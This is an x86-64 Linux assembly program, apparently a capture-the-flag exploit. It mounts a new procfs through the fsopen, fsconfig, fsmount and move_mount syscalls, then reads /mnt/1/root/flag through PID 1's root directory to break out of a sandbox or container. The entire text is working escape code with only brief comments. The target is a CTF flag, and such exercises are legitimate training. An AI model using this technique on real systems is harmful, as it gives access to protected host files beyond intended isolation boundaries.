section .data
    proc db "proc", 0
    errMessage db "[-] Error: negative return value.", 0xa, 0x0
    mnt_dir db "/mnt", 0
    null_byte db "", 0
    flag_addr db "/mnt/1/root/flag", 0

section .text
global _start
_start:

    mov rbp, rsp

; fsopen("proc", FSOPEN_CLOEXEC)
    mov rdi, proc
    push 1
    pop rsi
    mov rax, 0x1ae
    syscall
    test rax, rax
    js .errExit
    push rax

; fsconfig(fs_fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0)
    mov rdi, [rbp - 8]
    push 6
    pop rsi
    xor rdx, rdx
    xor r10, r10
    xor r8, r8
    mov rax, 431
    syscall
    test rax, rax
    js .errExit

; fsmount(fs_fd, FSOPEN_CLOEXEC, MOUNT_ATTR_RELATIME)
    mov rdi, [rbp - 8]
    push 1
    pop rsi
    xor rdx, rdx
    mov rax, 432
    syscall
    test rax, rax
    js .errExit
    push rax ; rbp - 0x10

    ; close 不 close 的无所谓了
    mov rdi, [rbp - 8]
    mov rax, 3
    syscall
    test rax, rax
    js .errExit

    mov rdi, mnt_dir
    mov rsi, 0777
    mov rax, 83
    syscall
    test rax, rax
    js .errExit

; move_mount(fd, "", AT_FDCWD, "/mnt", MOVE_MOUNT_F_EMPTY_PATH)
    mov rdi, [rbp - 0x10]
    mov rsi, null_byte
    mov rdx, -100
    mov r10, mnt_dir
    mov r8, 4
    mov rax, 429
    syscall
    test rax, rax
    js .errExit

    mov rdi, flag_addr
    xor esi, esi
    push 2
    pop rax
    syscall
    test rax, rax
    js .errExit
    push rax

    mov rdi, 1
    mov rsi, [rbp - 0x18]
    mov rdx, 0
    mov r10, 0x100
    mov rax, 0x28
    syscall
    js .errExit
    push rax

    mov eax, 60
    xor edi, edi
    syscall

.errExit:
    push 1
    pop rax
    push 1
    pop rdi
    mov rsi, errMessage
    mov rdx, 35
    syscall
    mov rax, 60
    mov rdi, 1
    syscall

